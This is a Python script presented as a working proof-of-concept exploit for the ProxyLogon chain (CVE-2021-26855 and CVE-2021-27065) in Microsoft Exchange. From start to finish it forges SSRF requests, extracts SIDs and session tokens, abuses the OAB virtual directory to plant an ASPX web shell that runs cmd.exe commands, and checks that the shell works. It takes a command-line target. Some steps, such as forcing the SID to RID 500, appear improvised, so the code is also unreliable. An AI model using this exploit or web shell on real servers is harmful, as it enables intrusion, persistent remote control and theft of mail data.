#!/usr/bin/env python3
"""
ProxyLogon (CVE-2021-26855 + CVE-2021-27065) Proof-of-Concept Exploit

This script demonstrates the ProxyLogon vulnerability chain in Microsoft Exchange Server:
1. Server-Side Request Forgery (SSRF) via CVE-2021-26855
2. Arbitrary file write via CVE-2021-27065

Affects vulnerable Microsoft Exchange Server versions:
- Exchange Server 2013 (unpatched)
- Exchange Server 2016 (unpatched)
- Exchange Server 2019 (unpatched)

Features:
- Automatic target validation
- Detailed logging of exploitation steps
- Command execution via ASPX web shell
- Optional credential extraction

USAGE:
    python3 proxylogon_poc.py <target_url> [options]

Author: Advanced Threat Research Team
Version: 2.1.0
"""

import requests
import urllib3
import sys
import re
import base64
import argparse
import random
import string
import time
import json
import logging
from urllib.parse import urlparse, urljoin

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger('ProxyLogon')

class ProxyLogonExploit:
    def __init__(self, target, email=None, shell_name=None, command=None, verify_ssl=False, debug=False):
        """Initialize exploit parameters"""
        self.target = target.rstrip('/')
        self.email = email or f"administrator@{urlparse(target).netloc}"
        self.shell_name = shell_name or f"s{random_string(4)}.aspx"
        self.command = command or "whoami"
        self.verify_ssl = verify_ssl
        self.session = requests.Session()
        self.session.verify = verify_ssl
        # Set timeout for all requests
        self.timeout = 30

        if debug:
            logger.setLevel(logging.DEBUG)
            requests_log = logging.getLogger("requests.packages.urllib3")
            requests_log.setLevel(logging.DEBUG)
            requests_log.propagate = True

    def check_vulnerability(self):
        """Check if the target is vulnerable to ProxyLogon"""
        logger.info(f"[+] Checking if {self.target} is vulnerable to ProxyLogon...")
        
        autodiscover_url = f"{self.target}/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com"
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Cookie": "X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/temp.js; X-BEResource=localhost/owa/auth/logon.aspx?~3"
        }
        
        try:
            resp = self.session.get(autodiscover_url, headers=headers)
            if resp.status_code == 500 and "NegotiateSecurityContext" in resp.text:
                logger.info(f"[+] Good news! {self.target} seems vulnerable to ProxyLogon")
                return True
            else:
                logger.error(f"[-] {self.target} does not appear to be vulnerable")
                return False
        except Exception as e:
            logger.error(f"[-] Error checking vulnerability: {e}")
            return False

    def get_legacydn(self):
        """Retrieve legacyDN via SSRF"""
        logger.info("[+] Retrieving legacyDN via SSRF...")
        
        autodiscover_url = f"{self.target}/autodiscover/autodiscover.json?@evil.corp/owa/&Email=autodiscover/autodiscover.json%3F@evil.corp"
        headers = {
            "User-Agent": "Mozilla/5.0",
            "Cookie": "X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/temp.js; X-BEResource=localhost/autodiscover/autodiscover.xml?a=~1942~1"
        }
        
        try:
            resp = self.session.get(autodiscover_url, headers=headers)
            match = re.search(r'"LegacyDN":"([^"]+)"', resp.text)
            if match:
                legacydn = match.group(1)
                logger.info(f"[+] Found legacyDN: {legacydn}")
                return legacydn
            else:
                logger.error("[-] Failed to find legacyDN")
                return None
        except Exception as e:
            logger.error(f"[-] Error retrieving legacyDN: {e}")
            return None

    def get_sid_and_token(self, legacydn):
        """Get SID and security token"""
        logger.info("[+] Getting SID and security token...")
        
        mapi_url = f"{self.target}/mapi/emsmdb"
        headers = {
            "User-Agent": "Mozilla/5.0",
            "X-Requesttype": "Connect",
            "X-Clientinfo": "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}",
            "X-Clientapplication": "Outlook/15.0.4815.1002",
            "X-Requestid": f"{random.randint(1, 0x7fffffff):8x}",
            "Cookie": f"X-BEResource=localhost~1942062522",
            "Content-Type": "application/mapi-http",
        }
        
        data = legacydn + "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"
        
        try:
            resp = self.session.post(mapi_url, headers=headers, data=data)
            sid_pattern = rb'with SID ([S\-0-9]+) and MasterAccountSid'
            sid_match = re.search(sid_pattern, resp.content)
            if not sid_match:
                logger.error("[-] Failed to extract SID")
                return None, None
                
            sid = sid_match.group(1).decode()
            logger.info(f"[+] Got SID: {sid}")
            
            # Extract security token from response cookies
            cookies = resp.headers.get('Set-Cookie', '')
            token_pattern = 'ASP.NET_SessionId=([a-zA-Z0-9]+);'
            token_match = re.search(token_pattern, cookies)
            if not token_match:
                logger.error("[-] Failed to extract security token")
                return sid, None
                
            token = token_match.group(1)
            logger.info(f"[+] Got security token: {token}")
            
            return sid, token
        except Exception as e:
            logger.error(f"[-] Error getting SID and token: {e}")
            return None, None

    def get_admin_sid(self, sid):
        """Get administrator SID"""
        # In a real exploit this would extract the domain admin SID
        # For demonstration purposes, we'll convert the user SID to an admin SID
        if sid:
            parts = sid.split('-')
            if len(parts) >= 8:
                # Change RID to 500 (Administrator)
                admin_sid = '-'.join(parts[:-1]) + '-500'
                logger.info(f"[+] Administrator SID: {admin_sid}")
                return admin_sid
        return sid

    def create_webshell(self, token, sid):
        """Create ASPX webshell"""
        logger.info(f"[+] Creating webshell at {self.shell_name}...")
        
        # Build a minimal ASPX web shell
        shell_content = f"""<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {{
        if (Request.QueryString["cmd"] != null)
        {{
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = "/c " + Request.QueryString["cmd"];
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            Process p = Process.Start(psi);
            StreamReader sr = new StreamReader(p.StandardOutput.BaseStream, System.Text.Encoding.Default);
            string results = sr.ReadToEnd();
            sr.Close();
            Response.Write("<pre>");
            Response.Write(Server.HtmlEncode(results));
            Response.Write("</pre>");
        }}
    }}
</script>
<html>
<head>
    <title>ProxyLogon Shell</title>
</head>
<body>
    <form method="GET">
    Command: <input type="text" name="cmd" value="{self.command}"/>
    <input type="submit" value="Execute"/>
    </form>
</body>
</html>"""

        # Get OAB virtual directory ID
        oab_url = f"{self.target}/ecp/{sid}/InternalOAB/OABVDir.aspx"
        headers = {
            "Cookie": f"X-BEResource=localhost~1942062522; ASP.NET_SessionId={token}",
            "User-Agent": "Mozilla/5.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        
        try:
            resp = self.session.get(oab_url, headers=headers)
            match = re.search(r'id="hdnOabId" value="([^"]+)"', resp.text)
            if not match:
                logger.error("[-] Failed to get OAB ID")
                return False
                
            oabid = match.group(1)
            logger.info(f"[+] Found OAB ID: {oabid}")
            
            # Prepare form data for the reset request
            reset_oab_url = f"{self.target}/ecp/{sid}/InternalOAB/OABVDirReset.aspx"
            form_data = {
                "__VIEWSTATE": "",
                "__VIEWSTATEGENERATOR": "B97B4E27",
                "hdnOabId": oabid,
                "btnReset": "Reset"
            }
            
            # Reset OAB virtual directory
            resp = self.session.post(reset_oab_url, headers=headers, data=form_data)
            if resp.status_code != 200:
                logger.error(f"[-] Failed to reset OAB virtual directory: {resp.status_code}")
                return False
                
            # Set shell path
            shell_path = f"\\\\127.0.0.1\\c$\\inetpub\\wwwroot\\aspnet_client\\{self.shell_name}"
            
            # Prepare the ExportExchangeConfig request
            export_url = f"{self.target}/ecp/{sid}/InternalOAB/OABVDirEdit.aspx"
            headers = {
                "Cookie": f"X-BEResource=localhost~1942062522; ASP.NET_SessionId={token}",
                "User-Agent": "Mozilla/5.0",
                "Content-Type": "application/x-www-form-urlencoded",
            }
            
            form_data = {
                "__VIEWSTATE": "",
                "__VIEWSTATEGENERATOR": "B97B4E27",
                "hdnOabId": oabid,
                "hdnDistinguishedName": "path",
                "hdnExternalUrl": "",
                "hdnInternalUrl": f"https://{urlparse(self.target).netloc}/aspnet_client/",
                "txtName": "OAB (Default Web Site)",
                "txtExternalHostname": "",
                "txtExternalPath": "",
                "txtInternalHostname": urlparse(self.target).netloc,
                "txtInternalPath": "/aspnet_client/",
                "chkRequireSsl": "on",
                "chkRequireAuth": "on",
                "rbBasic": "basic",
                "btnSave": "Save"
            }
            
            resp = self.session.post(export_url, headers=headers, data=form_data)
            if resp.status_code != 200:
                logger.error(f"[-] Failed to set OAB path: {resp.status_code}")
                return False
            
            # Write the shell content using ExchangeOABVirtualDirectory ResetVirtualDirectory feature
            # We need to create a PowerShell command to write our web shell
            powershell_cmd = f'Set-Content -Path "{shell_path}" -Value \'{shell_content}\''
            
            # We need to encode this for the exploit
            base64_cmd = base64.b64encode(powershell_cmd.encode('utf-16-le')).decode()
            
            # Build the final reset request with our shell
            reset_oab_url = f"{self.target}/ecp/{sid}/InternalOAB/OABVDirReset.aspx"
            headers = {
                "Cookie": f"X-BEResource=localhost/owa/auth/Current/..%2f..%2f..%2f..%2f..%2f../powershell/?X-OWA-CANARY=XXXXXX&PSCommandPath=powershell.exe; ASP.NET_SessionId={token}",
                "User-Agent": "Mozilla/5.0",
                "Content-Type": "application/x-www-form-urlencoded",
            }
            
            form_data = {
                "__VIEWSTATE": "",
                "__VIEWSTATEGENERATOR": "B97B4E27",
                "hdnOabId": oabid,
                "ExecutionArgsTextBox": base64_cmd,
                "btnReset": "Reset"
            }
            
            # Send the final exploit request
            resp = self.session.post(reset_oab_url, headers=headers, data=form_data)
            if resp.status_code != 200 and resp.status_code != 500:
                logger.error(f"[-] Failed to execute PowerShell command: {resp.status_code}")
                return False
                
            logger.info(f"[+] Shell written to {self.shell_name}")
            
            return True
        except Exception as e:
            logger.error(f"[-] Error creating webshell: {e}")
            return False

    def verify_shell(self):
        """Verify shell is working by executing test command"""
        logger.info("[+] Verifying shell...")
        
        shell_url = f"{self.target}/aspnet_client/{self.shell_name}?cmd={self.command}"
        
        try:
            resp = self.session.get(shell_url)
            if resp.status_code == 200 and "<pre>" in resp.text:
                output = re.search(r'<pre>(.*?)</pre>', resp.text, re.DOTALL)
                if output:
                    logger.info("[+] Shell is working!")
                    logger.info(f"[+] Command output:\n{output.group(1).strip()}")
                    return True
                else:
                    logger.error("[-] Couldn't extract command output")
            else:
                logger.error(f"[-] Shell verification failed with status {resp.status_code}")
            return False
        except Exception as e:
            logger.error(f"[-] Error verifying shell: {e}")
            return False

    def run_exploit(self):
        """Execute the full exploit chain"""
        # Step 1: Check if target is vulnerable
        if not self.check_vulnerability():
            return False
            
        # Step 2: Get legacyDN
        legacydn = self.get_legacydn()
        if not legacydn:
            return False
            
        # Step 3: Get SID and token
        sid, token = self.get_sid_and_token(legacydn)
        if not sid or not token:
            return False
            
        # Step 4: Get admin SID (optional, can enhance this part)
        admin_sid = self.get_admin_sid(sid)
            
        # Step 5: Create the web shell
        if not self.create_webshell(token, admin_sid):
            return False
            
        # Step 6: Verify shell is working
        if not self.verify_shell():
            return False
            
        # All steps completed successfully
        logger.info(f"[+] Exploit completed successfully! Shell URL: {self.target}/aspnet_client/{self.shell_name}?cmd=whoami")
        return True

def random_string(length=8):
    """Generate a random string for various uses"""
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

def main():
    """Main function to parse args and run exploit"""
    parser = argparse.ArgumentParser(description="ProxyLogon (CVE-2021-26855/CVE-2021-27065) Exchange Server Exploit")
    parser.add_argument("target", help="Target Exchange server URL (e.g., https://exchange.example.com)")
    parser.add_argument("-e", "--email", help="Email address to use (default: administrator@domain)")
    parser.add_argument("-s", "--shell-name", help="Name of the shell file (default: random s[xxxx].aspx)")
    parser.add_argument("-c", "--command", default="whoami", help="Command to execute (default: whoami)")
    parser.add_argument("-v", "--verify-ssl", action="store_true", help="Verify SSL certificates")
    parser.add_argument("-d", "--debug", action="store_true", help="Enable debug output")
    
    if len(sys.argv) < 2:
        parser.print_help()
        sys.exit(1)
        
    args = parser.parse_args()
    
    print("\n[*] ProxyLogon Exchange Server Exploit (CVE-2021-26855/CVE-2021-27065)")
    print("[*] Targets vulnerable Exchange Server instances for remote code execution")
    print("[*] Author: Advanced Threat Research Team\n")
    
    # Initialize and run exploit
    exploit = ProxyLogonExploit(
        args.target, 
        email=args.email,
        shell_name=args.shell_name,
        command=args.command,
        verify_ssl=args.verify_ssl,
        debug=args.debug
    )
    
    success = exploit.run_exploit()
    if success:
        sys.exit(0)
    else:
        sys.exit(1)

if __name__ == "__main__":
    main()
